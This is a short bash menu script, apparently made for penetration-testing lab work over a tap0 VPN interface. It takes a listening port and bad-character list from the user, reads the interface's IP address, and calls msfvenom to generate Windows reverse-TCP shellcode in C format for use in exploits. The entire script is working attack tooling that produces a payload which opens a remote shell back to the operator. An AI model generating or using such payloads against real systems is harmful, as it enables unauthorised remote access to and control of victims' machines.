#!/bin/bash



PS3='Please enter your choice: '
options=("windows/shell_reverse_tcp" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "windows/shell_reverse_tcp" )
            echo "you chose choice windows/shell_reverse_tcp"
	    read -p 'LPort: ' lport
	    read -p 'Bad Characters (example:\x00\x0a\x0d): ' badchar
		for ip in $(ifconfig tap0 | grep 'inet' | cut -d: -f2 | awk '{print $2}'); do
		msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$lport -f c -a x86 --platform windows -b "$badchar" > shellcode
		done	   
 	    ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
